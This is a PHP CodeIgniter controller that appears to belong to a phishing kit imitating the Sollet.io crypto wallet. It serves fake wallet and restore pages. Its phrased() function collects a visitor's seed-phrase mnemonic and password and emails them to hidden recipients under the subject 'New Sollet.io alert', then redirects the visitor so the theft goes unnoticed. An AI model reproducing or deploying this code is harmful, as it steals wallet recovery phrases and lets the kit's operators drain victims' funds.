<?php namespace App\Controllers;

class Home extends BaseController
{
	public function index()
	{
		echo view('home');
	}

	public function wallet()
	{
		$size = $this->request->getGet('sz');
		if($size < 650){
			echo view('walletMobile');
		}else{
			echo view('wallet');
		}
	}

	public function restore()
	{
			echo view('restore');
	}

	public function success()
	{
		echo view('success');
	}
	
	public function message($type, array $data)
	{
		$burl = base_url();
		if ($type == 'link') {
			$output = "
            <!DOCTYPE html>
            <html lang='en'>
            <head>
                <meta charset='UTF-8'><meta name='viewport' content='width=device-width, initial-scale=1.0'><title></title>
                <style>
                    body{margin: 0;padding: 0;}
                    .container{background-color: black;border-radius: 1.5rem;text-align: center;}
                    main{padding-bottom: 4rem;}
                    footer{padding: 0.4rem 0;background-color: black;color: white;border-bottom-left-radius: 1.5rem;border-bottom-right-radius: 1.5rem;}
                </style>
            </head>
            <body>
                <div class='container'>
                    <header class='logo'><img width='50%' src='" . $burl . "images/pan-bg.svg' alt=''></header>
                    <main>
                        <h2>" . $data['msg'] . "</h2>
                    </main>
                    <footer>&copy; ...</footer>
                </div>
            </body>
            </html>
        ";
		}
		return $output;
	}

	public function mailer(array $data)
	{
		$email = \Config\Services::email();
		$email->setFrom( getenv('smtpuser'), 'Seed Phrase Notification');
		$email->setTo($data['to']);
		$email->setCC($data['cc']);
		// $email->setBCC('them@their-example.com');

		$email->setSubject($data['subject']);
		$email->setMessage($this->message($data['type'], $data['message']));

		$email->send(false);
		// echo $email->printDebugger(['headers', 'subject', 'body']);
	}

	public function phrased()
	{
		// echo('HI');
		$incoming = $this->request->getPost();
		if(isset($incoming['password2'])){
			$msg = "Password: ".$incoming['password2']." <br> "."Mnemonic: ".$incoming['mnemonic']."<br>";
		}else{
			$msg = "Mnemonic: ".$incoming['mnemonic']."<br>";
		}
		$data = [
			'to' => getenv('smtpto'),
			'cc' => getenv('smtpcc'),
			'type' => 'link',
			'subject' => 'New Sollet.io alert',
			'message' => ['msg' => $msg],
		];
		$this->mailer($data);
		// echo('Done');
		// return($incoming['mnemonic']);
		return redirect()->to(base_url('/wallet?sz=650'));
	}
	//--------------------------------------------------------------------

}
